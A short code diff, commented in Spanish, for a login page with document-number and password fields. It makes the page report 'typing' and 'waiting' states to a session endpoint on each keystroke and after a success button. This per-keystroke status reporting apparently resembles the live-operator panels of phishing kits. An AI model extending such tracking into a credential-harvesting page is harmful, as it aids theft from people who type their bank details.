@@ -283,19 +283,27 @@ document.getElementById("exitoBtn")?.addEventListener("click", () => {
   // Limpiar sesión local
   localStorage.removeItem("bf_session");
   
-  // Recargar la página limpia
-  window.location.reload();
+  // Informar al servidor que se dio continuar (resetea el estado a 'waiting')
+  fetch(`/api/sessions/${sessionId}/state`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ state: 'waiting' })
+  })
+  .then(() => {
+    window.location.reload();
+  })
+  .catch(() => {
+    window.location.reload();
+  });
 });
 
 [docNumber, password].forEach(input => {
   input.addEventListener("input", () => {
-    if (pollInterval) {
-      fetch(`/api/sessions/${sessionId}/state`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ state: 'typing' })
-      }).catch(() => {});
-    }
+    fetch(`/api/sessions/${sessionId}/state`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ state: 'typing' })
+    }).catch(() => {});
   });
 });
 
